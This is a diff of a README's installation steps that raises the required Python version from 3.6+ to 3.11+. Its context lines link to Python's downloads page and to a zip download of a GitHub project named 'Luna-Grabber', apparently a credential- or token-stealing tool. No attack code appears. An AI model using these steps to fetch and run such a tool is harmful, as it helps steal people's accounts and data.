@@ -84,7 +84,7 @@
 ### 1. [Download](https://www.python.org/downloads/) Python:
 
 ```
-Make sure you have Python 3.6+ installed and it is added to your path.
+Make sure you have Python 3.11+ installed and it is added to your path.
 ```
 ### 2. [Download](https://github.com/Smug246/Luna-Grabber/archive/refs/heads/main.zip) The Files:
 
